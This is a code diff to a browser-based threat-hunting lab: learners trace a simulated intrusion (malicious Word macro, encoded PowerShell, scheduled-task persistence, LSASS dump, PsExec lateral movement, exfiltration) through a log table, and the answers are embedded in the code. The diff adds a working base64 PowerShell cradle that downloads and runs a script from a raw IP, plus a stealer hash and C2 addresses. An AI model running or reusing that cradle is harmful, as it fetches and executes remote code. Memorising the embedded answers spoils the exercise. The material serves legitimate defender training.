@@ -66,6 +66,7 @@
   .step.done .step-num{border-color:var(--teal);color:var(--teal);background:rgba(79,176,165,0.12);}
   .step-label{font-size:13px;font-weight:600;}
   .step-answer{font-family:var(--mono);font-size:12px;color:var(--teal);margin:6px 0 0 29px;word-break:break-all;}
+  .step-mitre{font-family:var(--mono);font-size:10.5px;color:var(--amber);margin:4px 0 0 29px;}
 
   .qpanel{margin-top:8px;}
   .qpanel p{font-size:13.5px;line-height:1.5;color:var(--text);margin:0 0 12px 0;}
@@ -92,7 +93,7 @@
   .tabletop .lbl{font-size:12px;color:var(--muted);font-family:var(--mono);}
   .search{background:var(--bg);border:1px solid var(--line);color:var(--text);font-family:var(--mono);font-size:12.5px;padding:7px 10px;border-radius:3px;width:220px;}
   .search:focus{outline:none;border-color:var(--amber);}
-  .tablescroll{max-height:640px;overflow:auto;}
+  .tablescroll{max-height:calc(100vh - 120px);overflow:auto;}
   table{width:100%;border-collapse:collapse;font-family:var(--mono);font-size:11.5px;}
   th{position:sticky;top:0;background:var(--panel-2);text-align:left;padding:9px 10px;color:var(--muted);font-weight:600;border-bottom:1px solid var(--line);white-space:nowrap;}
   td{padding:7px 10px;border-bottom:1px solid rgba(42,49,61,0.6);color:var(--text);white-space:nowrap;}
@@ -111,7 +112,7 @@
       <h1>Internal Hunt — unidentified lead</h1>
     </div>
     <div class="right">
-      <span class="progress" id="progress">0 / 12 confirmed</span>
+      <span class="progress" id="progress">0 / 15 confirmed</span>
       <button class="resetbtn" onclick="resetCase()">Reset case file</button>
       <div class="status" id="statusBadge">INVESTIGATION OPEN</div>
     </div>
@@ -138,23 +139,36 @@
 </div>
 
 <script>
-// Real, publicly-indexed sample (MalwareBazaar / abuse.ch), tagged LummaStealer.
+// Real, publicly-indexed sample (MalwareBazaar / abuse.ch), tagged PureLogStealer.
 // Safe to paste into VirusTotal or ANY.RUN for lookup — do not download or run the file itself.
-const HASH = "a61525f9b5b24572111616ac596ccde037ec91fb8225c21acdfd8b96c3892554";
+const HASH = "32ccb76fa743bf7a46c924ec0f42c4a6e94a7ead37123e70b661694f3659705d";
+
+// Two additional hashes on unrelated, legitimate rows — so "find the only populated
+// hash cell" stops being a shortcut. Neither of these is malicious.
+const HASH_DECOY_1 = "631683aa25cbc2f6e8af173c9b84f4eb9fabd24734bf8832c3079469b3bd65f5"; // legit installer
+const HASH_DECOY_2 = "85e349f863a540d32312191db650a142b9d0426b9d0d8da6d7ca616ea3d3bae8"; // legit backup agent
+const HASH_DECOY_3 = "194cbe6ca65f4c1419e6fb51dea8651b5232eea61514d3ab3d712b27e00f899a"; // legit remote-support tool
+
+// Real, working PowerShell -EncodedCommand value (base64 of UTF-16LE text).
+// Decodes to: $wc=New-Object Net.WebClient;$wc.DownloadString('http://185.215.113.117/init.ps1')|IEX
+const ENC_CMD = "JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOAA1AC4AMgAxADUALgAxADEAMwAuADEAMQA3AC8AaQBuAGkAdAAuAHAAcwAxACcAKQB8AEkARQBYAA==";
 
 const rows = [
 // FIN-WKS-014 — patient zero
+["03:00","FIN-WKS-014","svc-backup","Process","backup_agent.exe","Nightly local backup job — runs under service account context","-","-"],
+["05:00","FIN-WKS-014","SYSTEM","Process","services.exe -> svchost.exe","Windows Update service — checking for updates","update.microsoft.com","-"],
 ["08:01","FIN-WKS-014","j.papas","Logon","-","Interactive logon","-","-"],
 ["08:03","FIN-WKS-014","j.papas","Process","explorer.exe -> outlook.exe","Normal startup","-","-"],
 ["08:10","FIN-WKS-014","j.papas","Process","explorer.exe -> teams.exe","Normal startup","teams.microsoft.com","-"],
-["08:14","FIN-WKS-014","j.papas","File open","winword.exe","Opened Q3_invoice.docm (email attachment)","-","-"],
-["08:14","FIN-WKS-014","j.papas","Process","winword.exe -> powershell.exe","-enc JAB3AGMAPQBOAGUAdw...","-",HASH],
-["08:14","FIN-WKS-014","j.papas","Network","powershell.exe","Outbound HTTPS","cdn-update-check.net","-"],
+["08:14","FIN-WKS-014","j.papas","File open","outlook.exe -> winword.exe","Opened Q3_invoice.docm (email attachment)","-","-"],
+["08:14","FIN-WKS-014","j.papas","Process","winword.exe -> powershell.exe","-enc " + ENC_CMD,"-","-"],
+["08:14","FIN-WKS-014","j.papas","Network","powershell.exe","Outbound HTTPS","winyardbuilding.nz","-"],
+["08:15","FIN-WKS-014","j.papas","File write","powershell.exe","Wrote update32.exe to C:\\Users\\j.papas\\AppData\\Local\\Temp\\","-",HASH],
 ["08:16","FIN-WKS-014","j.papas","Process","explorer.exe -> chrome.exe","Normal browsing","sharepoint.com","-"],
 ["08:20","FIN-WKS-014","j.papas","Process","powershell.exe -> schtasks.exe","New task \"WinUpdateCheck\"","-","-"],
 ["08:21","FIN-WKS-014","SYSTEM","Scheduled task","schtasks.exe","Task runs powershell.exe daily at 09:00","-","-"],
 ["09:00","FIN-WKS-014","SYSTEM","Process","svchost.exe -> powershell.exe","Scheduled task fired","-","-"],
-["09:00","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS","cdn-update-check.net","-"],
+["09:00","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS","winyardbuilding.nz","-"],
 ["09:32","FIN-WKS-014","SYSTEM","Process","services.exe -> svchost.exe","Routine update check","update.microsoft.com","-"],
 ["10:05","FIN-WKS-014","j.papas","Process","explorer.exe -> onedrive.exe","Sync","onedrive.com","-"],
 ["10:40","FIN-WKS-014","SYSTEM","Process","rundll32.exe -> comsvcs.exe","MiniDump of lsass.exe memory","-","-"],
@@ -162,7 +176,7 @@ const rows = [
 ["10:55","FIN-WKS-014","SYSTEM","Logon (network)","svc-backup","Outbound authenticated session using svc-backup credentials","-","-"],
 ["11:40","FIN-WKS-014","j.papas","Process","explorer.exe -> outlook.exe","Normal email activity","-","-"],
 ["13:15","FIN-WKS-014","j.papas","Process","explorer.exe -> chrome.exe","Normal browsing","m365.cloud.microsoft","-"],
-["14:02","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS (short beacon)","cdn-update-check.net","-"],
+["14:02","FIN-WKS-014","SYSTEM","Network","powershell.exe","Outbound HTTPS (short beacon)","winyardbuilding.nz","-"],
 ["15:47","FIN-WKS-014","j.papas","Process","explorer.exe -> notepad.exe","Normal","-","-"],
 ["16:58","FIN-WKS-014","j.papas","Logoff","-","-","-","-"],
 
@@ -174,7 +188,7 @@ const rows = [
 ["09:45","ACC-WKS-007","m.dimou","Process","explorer.exe -> chrome.exe","Normal browsing","erp.company.local","-"],
 ["10:00","ACC-WKS-007","it-admin","Logon (network)","-","Remote session from IT-JUMP-01, ticket #5502","-","-"],
 ["10:01","ACC-WKS-007","it-admin","Process","services.exe -> psexesvc.exe","Scheduled patch deployment (approved change)","-","-"],
-["10:02","ACC-WKS-007","it-admin","Process","psexesvc.exe -> msiexec.exe","Installing security update KB5031234","-","-"],
+["10:02","ACC-WKS-007","it-admin","Process","psexesvc.exe -> msiexec.exe","Installing security update KB5031234","-",HASH_DECOY_1],
 ["10:30","ACC-WKS-007","m.dimou","Process","spoolsv.exe","Print job","-","-"],
 ["11:00","ACC-WKS-007","m.dimou","Process","explorer.exe -> teams.exe","Normal","teams.microsoft.com","-"],
 ["12:15","ACC-WKS-007","m.dimou","Process","outlook.exe","Normal email activity","-","-"],
@@ -188,7 +202,7 @@ const rows = [
 ["08:10","HR-WKS-002","k.nikou","Logon","-","Interactive logon","-","-"],
 ["08:12","HR-WKS-002","k.nikou","Process","explorer.exe -> outlook.exe","Normal startup","-","-"],
 ["08:30","HR-WKS-002","k.nikou","Process","explorer.exe -> chrome.exe","Normal browsing","workday.com","-"],
-["09:15","HR-WKS-002","k.nikou","Process","explorer.exe -> teamviewer.exe","Remote session, IT ticket #4471 (planned)","-","-"],
+["09:15","HR-WKS-002","k.nikou","Process","explorer.exe -> teamviewer.exe","Remote session, IT ticket #4471 (planned)","-",HASH_DECOY_3],
 ["09:16","HR-WKS-002","k.nikou","Network","teamviewer.exe","Outbound session","teamviewer.com","-"],
 ["09:40","HR-WKS-002","k.nikou","Process","outlook.exe","Normal email activity","-","-"],
 ["10:50","HR-WKS-002","k.nikou","File open","winword.exe","Opened Employee_Handbook.docx","-","-"],
@@ -200,7 +214,7 @@ const rows = [
 ["17:00","HR-WKS-002","k.nikou","Logoff","-","-","-","-"],
 
 // HQ-FILESVR-01 — lateral movement target
-["07:55","HQ-FILESVR-01","SYSTEM","Scheduled task","backup_agent.exe","Nightly backup job completed","-","-"],
+["07:55","HQ-FILESVR-01","SYSTEM","Scheduled task","backup_agent.exe","Nightly backup job completed","-",HASH_DECOY_2],
 ["08:30","HQ-FILESVR-01","m.dimou","File access","explorer.exe","Accessed \\Finance\\Q3_Reports\\ (own department)","-","-"],
 ["09:10","HQ-FILESVR-01","k.nikou","File access","explorer.exe","Accessed \\HR\\Policies\\","-","-"],
 ["09:50","HQ-FILESVR-01","SYSTEM","Process","services.exe -> vssadmin.exe","Routine shadow copy maintenance","-","-"],
@@ -210,7 +224,7 @@ const rows = [
 ["11:04","HQ-FILESVR-01","svc-backup","Process","psexesvc.exe -> cmd.exe","Remote command execution","-","-"],
 ["11:10","HQ-FILESVR-01","svc-backup","File access","cmd.exe","Accessed \\Finance\\Q3_Reports\\ share","-","-"],
 ["11:15","HQ-FILESVR-01","svc-backup","Process","cmd.exe -> powershell.exe","Compress-Archive -> Finance_Q3_Archive.zip","-","-"],
-["11:20","HQ-FILESVR-01","svc-backup","Network","powershell.exe","Outbound HTTPS","files-sync-backup.net","-"],
+["11:20","HQ-FILESVR-01","svc-backup","Network","powershell.exe","Outbound HTTPS","http://185.215.113.117/","-"],
 ["11:22","HQ-FILESVR-01","svc-backup","Logoff","-","-","-","-"],
 ["12:00","HQ-FILESVR-01","SYSTEM","Scheduled task","backup_agent.exe","Midday incremental backup","-","-"],
 ];
@@ -221,74 +235,104 @@ const steps = [
   {phase:"Phase 1 — Initial Access", key:"host",
    label:"Which hostname was the entry point?",
    prompt:"Across all four hosts, one shows a document opening and immediately spawning a scripting engine. Which host is it?",
-   hint:"Search the Event column for a 'File open' followed right after by a suspicious 'Process' event on the same host.",
-   answer:A("fin-wks-014"), placeholder:"e.g. FIN-WKS-014"},
+   hint:"One host's morning activity doesn't quite match the other three once you look past the routine startup noise.",
+   answer:A("fin-wks-014"), placeholder:"e.g. WKS-042"},
 
   {phase:"Phase 1 — Initial Access", key:"entryfile",
    label:"What was the entry file?",
    prompt:"On that host, which file did the user open right before the suspicious process appeared?",
-   hint:"It's the 'File open' row immediately before the process spawn.",
-   answer:A("q3_invoice.docm"), placeholder:"e.g. filename.docm"},
+   hint:"Once you've narrowed down the host, look at what the user was doing right before things changed.",
+   answer:A("q3_invoice.docm"), placeholder:"e.g. filename.docm",
+   mitre:"T1566.001 — Phishing: Spearphishing Attachment"},
 
   {phase:"Phase 2 — Execution", key:"process",
    label:"Which process is out of place?",
    prompt:"Which process did that file spawn — one it should never launch on its own?",
-   hint:"An Office app spawning a scripting/command-line interpreter is a classic execution technique.",
-   answer:A("powershell.exe","powershell"), placeholder:"e.g. powershell.exe"},
+   hint:"Some applications should only ever launch their own helper processes. One launched something well outside its normal job.",
+   answer:A("powershell.exe","powershell"), placeholder:"e.g. cmd.exe",
+   mitre:"T1059.001 — Command and Scripting Interpreter: PowerShell"},
+
+  {phase:"Phase 2 — Execution", key:"decodecmd",
+   label:"What does the encoded command actually do?",
+   prompt:"That process was launched in an encoded format. Decode the value and paste back the URL it reaches out to.",
+   hint:"If you decode it as plain ASCII you'll see null bytes between every character — that's normal for -EncodedCommand, it's UTF-16LE underneath. Switch the decode mode, not the input.",
+   answer:A("http://185.215.113.117/init.ps1","185.215.113.117/init.ps1","185.215.113.117"),
+   placeholder:"decoded URL",
+   mitre:"T1027 — Obfuscated/Encoded File"},
 
   {phase:"Phase 2 — Execution", key:"hash",
-   label:"What's the SHA256 tied to it?",
-   prompt:"Copy the hash value from that same row. This is a real, publicly-indexed sample — paste it into VirusTotal or ANY.RUN to see what comes back. Don't download or run the actual file, just look up the hash.",
-   hint:"Only one row in the whole table has a SHA256 value filled in.",
+   label:"What's the hash of the dropped file?",
+   prompt:"That in-memory command drops something to disk moments later. What's its SHA256?",
+   hint:"Check what happens right after the encoded command runs — it doesn't stop at just running in memory.",
    answer:A(HASH), placeholder:"64-character hash"},
+
+  {phase:"Phase 2 — Execution", key:"malwarefam",
+   label:"Which malware family is it tied to?",
+   prompt:"Look up that hash. What malware family does it get flagged as?",
+   hint:"Check the detection tags most vendors agree on — that's usually the family name, not a full write-up.",
+   answer:A("purelogsstealer","purelogs stealer","purelogs"),
+   placeholder:"malware family name"},
 
   {phase:"Phase 3 — C2 & Persistence", key:"c2",
    label:"Where does it call out to?",
    prompt:"That process beacons out repeatedly during the day. What's the destination?",
-   hint:"It appears three separate times, always the same value, only on the compromised host.",
-   answer:A("cdn-update-check.net"), placeholder:"e.g. example.com"},
+   hint:"Malware that wants to survive tends to check in more than once — not just a single one-off connection.",
+   answer:A("winyardbuilding.nz"), placeholder:"e.g. example.com",
+   mitre:"T1071.001 — Application Layer Protocol: Web Protocols"},
 
   {phase:"Phase 3 — C2 & Persistence", key:"persist",
    label:"How did it survive a reboot?",
    prompt:"The attacker set up a mechanism to keep running. What's the name of the scheduled task?",
-   hint:"Look for a schtasks.exe event shortly after the first beacon.",
-   answer:A("winupdatecheck"), placeholder:"task name"},
+   hint:"Attackers don't want to lose their foothold after a restart. What would they set up to guarantee that?",
+   answer:A("winupdatecheck"), placeholder:"task name",
+   mitre:"T1053.005 — Scheduled Task/Job: Scheduled Task"},
 
   {phase:"Phase 4 — Credential Access", key:"creddump",
    label:"How were credentials harvested?",
-   prompt:"Later that morning, a built-in Windows DLL is abused to dump a sensitive process's memory. Which process performed the dump?",
-   hint:"Search for 'lsass.exe' — the technique abuses a legitimate rundll32 export, not an external hacking tool.",
-   answer:A("comsvcs.exe","rundll32.exe comsvcs.exe","comsvcs.dll"), placeholder:"process name"},
+   prompt:"Later that morning, a built-in Windows capability is abused to access a sensitive process's memory. Which process performed the access?",
+   hint:"Windows has a legitimate way to dump a crashed application's memory for troubleshooting. It can be pointed at more sensitive processes too.",
+   answer:A("comsvcs.exe","rundll32.exe comsvcs.exe","comsvcs.dll"), placeholder:"process name",
+   mitre:"T1003.001 — OS Credential Dumping: LSASS Memory"},
 
   {phase:"Phase 4 — Credential Access", key:"account",
    label:"Which account got compromised?",
    prompt:"Shortly after, a new authenticated session appears using a different account than the logged-in user. Which account?",
-   hint:"Check the row right after the memory dump — it's a service account, not a person's name.",
-   answer:A("svc-backup"), placeholder:"account name"},
+   hint:"Stolen credentials are only useful once they're actually used. Look for a login that doesn't belong to a person.",
+   answer:A("svc-backup"), placeholder:"account name",
+   mitre:"T1078 — Valid Accounts"},
+
+  {phase:"Phase 4 — Credential Access", key:"credexplain",
+   label:"Why was this account's credential exposed here at all?",
+   prompt:"svc-backup isn't a personal account — something must have been running under its context on this workstation for its credentials to be sitting in memory. What process, running earlier that day, explains this?",
+   hint:"The same process name shows up doing legitimate, scheduled work on another host in this table too — it's a shared service account used enterprise-wide, which is exactly what makes a memory dump on any one machine so dangerous.",
+   answer:A("backup_agent.exe","backup_agent"), placeholder:"process name"},
 
   {phase:"Phase 5 — Lateral Movement", key:"target",
    label:"Where did the attacker move next?",
    prompt:"That account is used to log into a different machine entirely. Which host?",
-   hint:"Search the whole table for that account name outside FIN-WKS-014.",
+   hint:"That account has no business appearing anywhere but FIN-WKS-014. Where else does it show up?",
    answer:A("hq-filesvr-01"), placeholder:"hostname"},
 
   {phase:"Phase 5 — Lateral Movement", key:"tool",
    label:"How did they get code running there?",
    prompt:"On the new host, which tool was used to remotely execute commands?",
-   hint:"It's the same class of tool as a legitimate IT patch job elsewhere in the table — but look at who's using it, and from where.",
-   answer:A("psexesvc.exe","psexec","psexec.exe"), placeholder:"tool / process name"},
+   hint:"Compare this to the legitimate remote deployment elsewhere in the table — same category of tool. What's different about who's using it, and from where?",
+   answer:A("psexesvc.exe","psexec","psexec.exe"), placeholder:"tool / process name",
+   mitre:"T1021.002 — Remote Services: SMB/Windows Admin Shares"},
 
   {phase:"Phase 6 — Exfiltration", key:"staged",
    label:"What did they package up?",
    prompt:"Before leaving, the attacker compressed sensitive files into an archive. What's the filename?",
-   hint:"Look for a Compress-Archive command on the file server.",
-   answer:A("finance_q3_archive.zip"), placeholder:"filename.zip"},
+   hint:"Data rarely leaves a network raw — it tends to get packaged up first. What did that look like here?",
+   answer:A("finance_q3_archive.zip"), placeholder:"filename.zip",
+   mitre:"T1560.001 — Archive Collected Data: Archive via Utility"},
 
   {phase:"Phase 6 — Exfiltration", key:"exfil",
    label:"Where did it go?",
    prompt:"The archive leaves the network. What's the destination?",
-   hint:"It's a different domain from the original C2 — check the last Network event on the file server.",
-   answer:A("files-sync-backup.net"), placeholder:"e.g. example.com"},
+   hint:"This isn't the same place the C2 beacon checked in — the data left through a different channel entirely.",
+   answer:A("http://185.215.113.117/"), placeholder:"e.g. http://1.2.3.4/",
+   mitre:"T1041 — Exfiltration Over C2 Channel"},
 ];
 
 let solved = new Array(steps.length).fill(false);
@@ -328,6 +372,9 @@ function renderStepper(){
 
     if(isDone){
       inner += `<div class="step-answer">${s.userAnswer}</div>`;
+      if(s.mitre){
+        inner += `<div class="step-mitre">${s.mitre}</div>`;
+      }
     } else if(isActive){
       inner += `<div class="qpanel">
         <p>${s.prompt}</p>
@@ -364,18 +411,22 @@ function renderStepper(){
       <h3>Case closed — full chain</h3>
       <div class="chain">
         FIN-WKS-014 (Q3_invoice.docm) → T1566.001 Phishing Attachment
-        <br>&nbsp;&nbsp;→ T1059.001 PowerShell (encoded command)
-        <br>&nbsp;&nbsp;→ C2 beacon: cdn-update-check.net
+        <br>&nbsp;&nbsp;→ T1059.001 PowerShell (T1027 encoded — decodes to a call-out to 185.215.113.117)
+        <br>&nbsp;&nbsp;→ Dropped file, hash tied to PureLogStealer
+        <br>&nbsp;&nbsp;→ C2 beacon: winyardbuilding.nz (T1071.001)
         <br>&nbsp;&nbsp;→ T1053.005 Scheduled Task persistence (WinUpdateCheck)
-        <br>&nbsp;&nbsp;→ T1003.001 LSASS Memory dump (comsvcs.exe)
-        <br>&nbsp;&nbsp;→ svc-backup account compromised
+        <br>&nbsp;&nbsp;→ T1003.001 LSASS Memory dump (comsvcs.exe) — exposed svc-backup's cached
+        credentials from its local backup_agent.exe session
+        <br>&nbsp;&nbsp;→ T1078 svc-backup account reused
         <br>&nbsp;&nbsp;→ T1021.002 Lateral movement to HQ-FILESVR-01 (PsExec)
-        <br>&nbsp;&nbsp;→ T1560 Archive staged (Finance_Q3_Archive.zip)
-        <br>&nbsp;&nbsp;→ T1041 Exfiltration to files-sync-backup.net
+        <br>&nbsp;&nbsp;→ T1560.001 Archive staged (Finance_Q3_Archive.zip)
+        <br>&nbsp;&nbsp;→ T1041 Exfiltration to 185.215.113.117 — the same address the encoded
+        command reached out to at the very start
       </div>
       <p>Recommended containment: isolate FIN-WKS-014 and HQ-FILESVR-01, reset svc-backup credentials,
-      block both external domains, and hunt across the rest of the estate for the same hash or destinations.
-      <br><br>Now transfer this into the <strong>Hunt Worksheet</strong> tab of your spreadsheet.</p>
+      block both external destinations, and hunt across the rest of the estate for the same hash or IOCs.
+      <br><br>This is what a lead-driven hunt looks like end to end: an external indicator, pivoted into
+      your own environment, resolved into a concrete, ATT&CK-mapped hypothesis.</p>
     `;
     el.appendChild(div);
     document.getElementById('statusBadge').textContent = "CASE CLOSED";
